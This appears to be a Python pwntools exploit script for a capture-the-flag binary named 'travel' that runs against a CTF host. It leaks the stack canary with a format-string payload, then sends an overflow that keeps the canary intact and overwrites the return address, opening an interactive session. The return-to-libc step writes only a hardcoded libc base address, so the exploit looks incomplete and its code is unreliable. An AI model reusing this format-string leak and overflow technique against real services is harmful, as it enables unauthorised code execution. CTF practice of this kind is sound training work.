from pwn import *
import threading
from struct import pack

# settings
context.log_level = 'WARNING'
context.terminal = ['konsole', '-e']

libc = ELF('./libc.so.6')
LOCAL = "./travel"
REMOTE = ["01.linux.challenges.ctf.thefewchosen.com", 50106]

class Exploit:
    def __init__(self, local=False, debug=False):
        if local:
            self.p = "process(LOCAL, env={'LD_PRELOAD': './libc.so.6'})"
        else:
            self.p = "remote(REMOTE[0], REMOTE[1])"
        
        self.debug = debug
        self.canary_address = 33
        self.buffer_max = 215
        self.libc_base = 0x7faa483eb000
    
    def get_canary(self, proc):
        'sending format string to leak the stack canary'
        payload = (f"%{self.canary_address}$p").encode()
        p = proc.recv(100)
        p = proc.sendline(payload)
        p = proc.recvline().decode()
        p = p[9:26]
        p = pack("<Q", int(p, 16))
        return p
    
    def return_to_libc(self, proc, canary):
        if self.debug:
            script = "b *main+323"
            gdb.attach(proc, gdbscript=script)
        
        payload = b"A"*(self.buffer_max-15)     # padding - formatstring
        payload += canary                       # canary value
        payload += b'\x90'*8                    # junk
        
        payload += pack("<Q", self.libc_base)
        
        p = proc.recv(100)
        p = proc.sendline(payload)
        p = proc.recv(100)
        proc.interactive()
        
    def start(self):
        with eval(self.p) as r:
            canary = self.get_canary(r)
            self.return_to_libc(r, canary)
            

Exploit(local=True, debug=True).start()
